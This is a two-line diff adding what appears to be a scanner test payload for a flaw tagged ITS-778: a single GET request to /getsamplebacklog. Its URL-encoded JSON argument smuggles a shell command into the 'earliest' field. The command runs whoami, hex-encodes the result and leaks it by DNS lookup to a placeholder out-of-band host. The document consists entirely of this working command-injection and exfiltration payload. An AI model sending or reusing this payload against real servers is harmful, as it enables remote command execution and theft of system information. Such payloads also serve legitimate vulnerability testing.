@@ -1,0 +1,2 @@
+# Vulnerable: ITS-778
+GET /getsamplebacklog?arg1=2d0ows2x9anpzaorxi9h4csmai08jjor&arg2=%7b%22type%22%3a%22client%22%2c%22earliest%22%3a%221676976316.328%7c%7cnslookup%20%24(xxd%20-pu%20%3c%3c%3c%20%24(whoami)).{{interactsh-url}}%7c%7cx%22%2c%22latest%22%3a1676976916.328%2c%22origins%22%3a%5b%7b%22ip%22%3a%22{{Hostname}}%22%2c%22source%22%3a0%7d%5d%2c%22seriesID%22%3a3%7d&arg3=undefined&arg4=undefined&arg5=undefined&arg6=undefined&arg7=undefined
